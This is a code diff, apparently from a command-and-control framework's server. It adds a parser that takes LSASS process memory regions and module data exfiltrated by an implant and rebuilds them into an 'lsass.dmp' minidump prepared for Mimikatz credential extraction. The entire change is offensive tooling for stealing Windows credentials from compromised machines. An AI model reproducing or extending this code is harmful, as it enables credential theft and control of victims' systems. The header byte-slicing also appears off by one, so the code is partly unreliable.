@@ -1,5 +1,7 @@
 import os
-from c2.c2_server import read_c2_log
+from c2.c2_server import read_c2_log, ConnectionStorage
+from c2.c2_facts import FactsStorage
+import c2.makeminidump
 
 
 def null_parser(conn_uuid, cmd_indexes_list):
@@ -71,3 +73,36 @@ def version_parser(conn_uuid, cmd_indexes_list):
         ('minor_version', dwMinorVersion),
         ('build_number', dwBuildNumber)
     ]
+
+
+def process_dump_parser_to_minidump(conn_uuid, cmd_indexes_list):
+    # note: this parser requires major_version, minor_version and build_number as facts
+    index = cmd_indexes_list[0]
+    data = read_c2_log(conn_uuid, index, decode=False)
+    data = b'\n'.join(data.split(b'\n')[2:])
+    connectionStorage = ConnectionStorage()
+    facts = FactsStorage(connectionStorage, conn_uuid)
+    dwMajorVersion, dwMinorVersion, dwBuildNumber = \
+        facts.getFact('major_version'), facts.getFact('minor_version'), facts.getFact('build_number')
+    regions, modules = [], []
+    while len(data) > 0:
+        header, data = data[:16], data[16:]
+        scrape_type = int.from_bytes(header[0:3], byteorder='little')
+        size = int.from_bytes(header[4:7], byteorder='little')
+        region = int.from_bytes(header[8:15], byteorder='little')
+        if scrape_type == 1:
+            reg_data, data = data[:size], data[size:]
+            regions.append((region, reg_data))
+        elif scrape_type == 0:
+            module_data, data = data[:100], data[100:]
+            module_data = b"\\\x00" + module_data   # Mimikatz wcsrchr
+            modules.append((region, size, module_data))
+    c2.makeminidump.makeminidump(
+        os.path.join('/usr/src/app/c2/connections', conn_uuid, "lsass.dmp"),
+        dwMajorVersion,
+        dwMinorVersion,
+        dwBuildNumber,
+        regions,
+        modules
+    )
+    return []
